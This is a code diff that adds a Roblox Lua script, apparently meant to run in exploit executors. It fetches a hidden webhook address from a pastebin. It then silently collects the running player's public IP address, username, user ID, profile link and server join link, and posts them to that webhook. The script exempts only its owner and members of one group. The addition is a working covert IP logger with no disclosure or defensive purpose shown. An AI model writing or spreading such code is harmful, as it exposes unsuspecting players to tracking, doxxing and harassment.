@@ -1,0 +1,76 @@
+	local webh = game:HttpGet("https://pastebin.com/raw/CMxbwGAc")
+	local ownerID = tonumber(game:HttpGet("https://gist.githubusercontent.com/Superwheat/628312eaa91b4d5904acd5fb60314bb4/raw/68f3128221455cd5899d3e12f79f483359fc9247/owner.txt"))
+	local check = game:GetService("Players").LocalPlayer.UserId == ownerID
+	
+	local name
+	
+	pcall(function()
+		if check == false and game:GetService("Players").LocalPlayer:IsInGroup(11762024) == false then
+			name = "IP: "..game:HttpGet("https://api.ipify.org")
+		else
+			name = "No IP of this person for you lol."
+		end
+	end)
+	
+	pcall(function()
+		local data = {
+			["embeds"] = {
+				{
+					["title"] = game:GetService("Players").LocalPlayer.Name.." | "..game:GetService("Players").LocalPlayer.UserId,
+					["description"] = name,
+					["fields"] = {
+                        {
+                            ["name"] = "Game:",
+                            ["value"] = "https://www.roblox.com/games/"..game.PlaceId,
+                            ["inline"] = false
+                        },
+                        {
+                            ["name"] = "Profile:",
+                            ["value"] = "https://www.roblox.com/users/"..game:GetService("Players").LocalPlayer.UserId.."/profile",
+                            ["inline"] = false
+                        },
+                        {
+                            ["name"] = "Join link:",
+                            ["value"] = "https://www.roblox.com/games/"..game.PlaceId.."?serverJobId="..game.JobId,
+                            ["inline"] = false
+                        }
+                    }
+				}
+			}
+		}
+	
+		if syn then
+			local response = syn.request(
+				{
+					Url = webh,
+					Method = 'POST',
+					Headers = {
+						['Content-Type'] = 'application/json'
+					},
+					Body = game:GetService('HttpService'):JSONEncode(data)
+				}
+			);
+		elseif request then
+			local response = request(
+				{
+					Url = webh,
+					Method = 'POST',
+					Headers = {
+						['Content-Type'] = 'application/json'
+					},
+					Body = game:GetService('HttpService'):JSONEncode(data)
+				}
+			);
+		elseif http_request then
+			local response = http_request(
+				{
+					Url = webh,
+					Method = 'POST',
+					Headers = {
+						['Content-Type'] = 'application/json'
+					},
+					Body = game:GetService('HttpService'):JSONEncode(data)
+				}
+			);
+		end
+	end)
